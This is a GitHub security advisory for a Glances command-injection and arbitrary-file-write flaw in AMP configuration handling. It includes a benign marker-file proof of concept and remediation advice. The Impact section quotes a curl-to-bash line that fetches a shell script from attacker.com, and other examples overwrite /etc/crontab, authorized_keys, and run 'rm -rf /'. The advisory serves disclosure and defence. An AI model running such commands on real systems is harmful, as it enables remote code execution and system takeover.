# [H] Glances has arbitrary file write and command execution via `secure_popen` redirection and chaining operators in AMP command configuration

## Summary
Severity: High
Advisory: GHSA-3vwc-qwhc-3mj7
CVE: CVE-2026-53925
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-23
Source: https://github.com/advisories/GHSA-3vwc-qwhc-3mj7
Type: github-advisory

## Affected
- PyPI: `glances` — affected >=4.0.8 <4.5.5

## Details
### Summary

The `secure_popen()` function in `glances/secure.py` interprets `>` (file redirection), `|` (pipe), and `&&` (command chaining) operators in command strings. These operators are applied without any validation on the target file path, piped command, or chained command.

When Application Monitoring Process (AMP) modules load their `command` or `service_cmd` configuration values from `glances.conf`, those values are passed directly to `secure_popen()` with no sanitization. This allows an attacker who can modify the Glances configuration file to write arbitrary content to arbitrary filesystem paths (via `>`), chain arbitrary commands (via `&&`), or pipe command output to arbitrary programs (via `|`).

Crucially, this vulnerability is **not mitigated** by the `--disable-config-exec` flag that was introduced to address CVE-2026-33641. That flag only disables backtick command execution in `config.get_value()`; it does not affect the `secure_popen()` function's interpretation of shell-like operators.

### Details

**Affected code path 1 — Default AMP (`glances/amps/default/__init__.py:69`)**

```python
res = self.get('command')
# ...
self.set_result(secure_popen(res).rstrip())
```

The `command` config value is loaded from `[amp_<name>]` sections via `GlancesAmp.load_config()` (`glances/amps/amp.py:81`):

```python
self.configs[param] = config.get_value(amp_section, param).split(',')
```

**Affected code path 2 — SystemV AMP (`glances/amps/systemv/__init__.py:60`)**

```python
res = secure_popen(self.get('service_cmd'))
```

The `service_cmd` config value is loaded from `[amp_systemv]` sections via the same `GlancesAmp.load_config()` method.

**Sink — `secure_popen()` (`glances/secure.py:33-77`)**

The function explicitly parses:
- `>` for file redirection (line 39): `cmd.split('>')` — the path after `>` is used directly in `open(stdout_redirect, "w")` (line 71) with **no path validation**.
- `|` for command piping (line 51): `cmd.split('|')` — each segment is executed as a separate `Popen` with stdout piped to the next.
- `&&` for command chaining (line 27 in `secure_popen`): `cmd.split('&&')` — each segment is executed sequentially.

None of these operators are sanitized or restricted when loading AMP configuration values.

**Why `--disable-config-exec` does not help:**

The `--disable-config-exec` flag (introduced for CVE-2026-33641) only prevents `system_exec()` from running backtick-embedded commands in `config.get_value()`. It does not affect how the resulting string value is processed by `secure_popen()`. A command value like `echo data > /etc/crontab` contains no backticks and passes through `get_value()` unchanged, then `secure_popen()` interprets the `>` operator and writes to the arbitrary path.

### PoC

**Clean-checkout recipe:**

1. Create a test configuration file:

```bash
cat > /tmp/poc-glances.conf << 'EOF'
[amp_poc]
enable=true
regex=.*
refresh=3
command=echo POC_ARBITRARY_FILE_WRITE > /tmp/cve-poc-marker-amp

[outputs]
cors_origins=*
EOF
```

2. Run a Python script that simulates the AMP command execution path:

```python
import sys
sys.path.insert(0, '/path/to/glances')
from glances.config import Config
from glances.secure import secure_popen
import os

# Load config with --disable-config-exec ACTIVE (CVE-2026-33641 mitigation)
config = Config(config_dir='/tmp/poc-glances.conf', disable_config_exec=True)

# Read AMP command value (same as amp.py load_config)
command = config.get_value('amp_poc', 'command')
print(f'Command: {command!r}')

# Execute (same as amps/default/__init__.py line 69)
marker = '/tmp/cve-poc-marker-amp'
assert not os.path.exists(marker), 'Clean state required'
result = secure_popen(command)
print(f'Result: {result!r}')

# Verify arbitrary file write occurred
assert os.path.exists(marker), 'VULNERABILITY NOT CONFIRMED'
with open(marker) as f:
    content = f.read()
print(f'Written to {marker}: {content!r}')
assert 'POC_ARBITRARY_FILE_WRITE' in content

# Cleanup
os.remove(marker)
print('CONFIRMED: Arbitrary file write via secure_popen > in AMP command')
```

**Expected vulnerable output:**

```
Command: 'echo POC_ARBITRARY_FILE_WRITE > /tmp/cve-poc-marker-amp'
Result: 'POC_ARBITRARY_FILE_WRITE\n'
Written to /tmp/cve-poc-marker-amp: 'POC_ARBITRARY_FILE_WRITE\n'
CONFIRMED: Arbitrary file write via secure_popen > in AMP command
```

**Negative/control case (demonstrating `--disable-config-exec` only blocks backticks):**

```python
# This IS blocked by --disable-config-exec:
# command=`rm -rf /` → get_value() skips backtick execution

# This is NOT blocked by --disable-config-exec:
# command=echo data > /etc/crontab → secure_popen writes to /etc/crontab
```

**Cleanup:**

```bash
rm -f /tmp/poc-glances.conf /tmp/cve-poc-marker-amp
```

### Impact

An attacker who can modify `glances.conf` (e.g., through a separate file-write vulnerability, a misconfigured shared filesystem, a configuration management system, or a container volume mount) can:

1. **Write arbitrary content to arbitrary files** via the `>` operator — e.g., overwriting `/etc/crontab`, `~/.ssh/authorized_keys`, or any file writable by the Glances process user.

2. **Execute arbitrary commands** via the `&&` and `|` operators — e.g., `echo x && curl http://attacker.com/shell.sh | bash`.

3. **Exfiltrate data** via the `|` operator piping command output to network utilities.

The existing `--disable-config-exec` mitigation for CVE-2026-33641 does not protect against this vulnerability because it operates at a different layer (`config.get_value()` backtick processing vs. `secure_popen()` operator interpretation).

### Suggested remediation

1. **Remove file redirection support from `secure_popen()`** unless explicitly required. The `>` operator in `__secure_popen()` (lines 39-45, 69-72) writes to arbitrary paths. Consider removing this feature or restricting output paths to a safe directory (e.g., a configured output directory with path traversal protection).

2. **Sanitize AMP command values** before passing them to `secure_popen()`. Apply the same sanitization used in `actions.py:_sanitize_mustache_dict()` to strip `&&`, `|`, `>>`, and `>` from AMP command and service_cmd config values, or refuse to execute commands containing these operators.

3. **Consider replacing `secure_popen()` with `subprocess.run(shell=False)`** using explicit argument arrays. The `secure_popen()` function reimplements shell-like operator parsing (`&&`, `|`, `>`) which is inherently risky. Standard `subprocess.run()` with `shell=False` and an explicit argument list avoids this class of vulnerability entirely.

4. **Add a regression test** that verifies AMP commands cannot contain file redirection or command chaining operators.

### Credits
- Thai Son Dinh from VinSOC Labs (R&D)
- Nguyen Huy Vu Dung from VinSOC Labs (AppSec)

## References
- https://github.com/nicolargo/glances/security/advisories/GHSA-3vwc-qwhc-3mj7
- https://nvd.nist.gov/vuln/detail/CVE-2026-53925
- https://github.com/advisories/GHSA-3vwc-qwhc-3mj7
- https://github.com/nicolargo/glances
- https://github.com/nicolargo/glances/releases/tag/v4.5.5
- https://github.com/pypa/advisory-database/tree/main/vulns/glances/PYSEC-2026-2494.yaml
- https://pypi.org/project/glances
